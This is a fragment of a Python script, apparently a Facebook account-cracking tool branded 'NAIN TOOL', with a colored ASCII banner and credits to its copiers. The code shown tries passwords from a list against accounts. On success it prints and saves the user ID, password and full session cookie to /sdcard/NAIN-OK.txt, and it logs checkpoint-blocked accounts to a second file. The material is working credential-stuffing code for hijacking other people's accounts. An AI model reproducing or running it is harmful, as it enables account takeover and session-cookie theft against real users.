...
\033[1;32m   $$ |\$$$ |$$ |  $$ |  $$ |  $$ |\$$$ |
\033[1;35m   $$ | \$$ |$$ |  $$ |$$$$$$\ $$ | \$$ |
\033[1;35m   \__|  \__|\__|  \__|\______|\__|  \__|
                                      
                                      
                                                                          
                                       
\033[1;37m================= \33[32;45mNAIN_X_ZOYA\33[0;m =====================
     Source By : NAIN
   
\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :  \033[1;33mYAsir\33[0;m\033[1;32m _X_ \033[1;33mMarwan\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[96;1m TH3 CH3RY\____😘😈😘
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35  TH3 NAIN
...
\033[1;37m================= \33[32;45mYAasirOo\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO NAIN  TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m(NAIN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NAIN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m(NAIN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/NAIN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[NAIN] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
